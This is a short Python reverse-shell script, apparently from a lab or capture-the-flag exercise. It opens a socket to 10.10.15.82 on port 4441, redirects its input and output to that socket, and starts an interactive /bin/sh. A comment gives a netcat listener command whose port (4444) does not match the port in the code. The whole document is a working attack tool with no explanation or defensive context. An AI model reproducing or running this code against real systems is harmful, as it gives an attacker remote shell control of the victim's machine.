import socket,subprocess,os
"""nc -lvp 4444 for listening"""
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.82",4441))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
